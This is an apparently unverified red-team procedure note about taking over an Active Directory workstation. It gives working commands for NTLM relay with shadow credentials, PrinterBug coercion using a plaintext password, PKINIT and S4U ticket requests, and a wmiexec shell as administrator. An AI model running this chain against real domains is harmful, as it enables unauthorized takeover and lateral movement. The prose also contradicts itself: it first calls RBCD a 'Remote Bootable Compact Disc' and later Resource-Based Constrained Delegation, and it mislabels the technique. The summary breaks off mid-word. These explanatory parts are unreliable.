---
id: 3f30f320-14c1-4d49-b8b8-f8f716ca8477
name: Workstation Takeover with RBCD
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.329973+00:00'
updated_at: '2023-04-10T20:26:05.009338+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Pass the Hash|T1075 - Pass the Hash]]'
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Shadow Credentials]]'
commands:
- '[[Add Reverse Port Forward from 8081 to Team Server 81]]'
- '[[Execute printer bug to trigger authentication from target workstation]]'
- '[[Get a ST (service ticket) for the target account]]'
- '[[Get a TGT using the newly acquired certificate via PKINIT]]'
- '[[Set up ntlmrelayx to relay authentication from target workstation to DC]]'
- '[[Utilize the ST for future activity]]'
---

# Workstation Takeover with RBCD

## Summary

Workstation Takeover with RBCD is an attack technique that leverages the use of Remote Bootable Compact Disc (RBCD) to gain access to a target system. This technique is used to obtain shadow credentials from a target system and then use these credentials to move laterally within a network. The atta

## Description

# Description

Workstation Takeover with RBCD is an attack technique that leverages the use of Remote Bootable Compact Disc (RBCD) to gain access to a target system. This technique is used to obtain shadow credentials from a target system and then use these credentials to move laterally within a network. The attacker can then escalate privileges and gain access to sensitive data.

Technical Explanation: RBCD is a bootable CD that can be used to start a computer without using the installed operating system. This technique allows the attacker to bypass security measures such as antivirus software and firewalls. Once the attacker has access to the target system, they can obtain shadow credentials and use them to move laterally within the network.

Business Value: This attack technique can be used to gain unauthorized access to sensitive data, steal intellectual property, or cause damage to a company's reputation.

 

## Requirements

1. Access to a target system

1. RBCD

 

## Defense

1. Implement strong password policies and multi-factor authentication to prevent the use of weak passwords and unauthorized access to systems

1. Regularly monitor and audit network activity to detect unauthorized access and suspicious behavior

1. Implement network segmentation to limit lateral movement within the network

 

## Objectives

1. Gain access to a target system

1. Obtain shadow credentials

1. Move laterally within a network

1. Escalate privileges

1. Access sensitive data

 

# Instructions

1. 1. Add Reverse Port Forward from 8081 to Team Server 81.
2. Set up ntlmrelayx to relay authentication from target workstation to DC.
3. Execute printer bug to trigger authentication from target workstation.
4. Get a TGT using the newly acquired certificate via PKINIT.
5. Get a ST (service ticket) for the target account.
6. Utilize the ST for future activity.

 



**Code**: [[# Only for C2: Add Reverse Port Forward from 8081 ]]



> This command is used to execute a scenario where the attacker takes over a workstation using RBCD (Resource-Based Constrained Delegation). The command involves adding a reverse port forward from 8081 to Team Server 81, setting up ntlmrelayx to relay authentication from target workstation to DC, executing a printer bug to trigger authentication from target workstation, getting a TGT using the newly acquired certificate via PKINIT, getting a ST (service ticket) for the target account, and utilizing the ST for future activity.



**Command** ([[Add Reverse Port Forward from 8081 to Team Server 81]]):

```bash
# Only for C2: Add Reverse Port Forward from 8081 to Team Server 81
```





**Command** ([[Set up ntlmrelayx to relay authentication from target workstation to DC]]):

```bash
proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81
```





**Command** ([[Execute printer bug to trigger authentication from target workstation]]):

```bash
proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file
```





**Command** ([[Get a TGT using the newly acquired certificate via PKINIT]]):

```bash
proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
```





**Command** ([[Get a ST (service ticket) for the target account]]):

```bash
proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
```





**Command** ([[Utilize the ST for future activity]]):

```bash
export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
```



## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Pass the Hash|T1075 - Pass the Hash]]
- [[Remote Services|T1021 - Remote Services]]

## Commands Used

- [[Add Reverse Port Forward from 8081 to Team Server 81]]
- [[Execute printer bug to trigger authentication from target workstation]]
- [[Get a ST (service ticket) for the target account]]
- [[Get a TGT using the newly acquired certificate via PKINIT]]
- [[Set up ntlmrelayx to relay authentication from target workstation to DC]]
- [[Utilize the ST for future activity]]

## Tags

- [[Active Directory Attacks]]
- [[Shadow Credentials]]


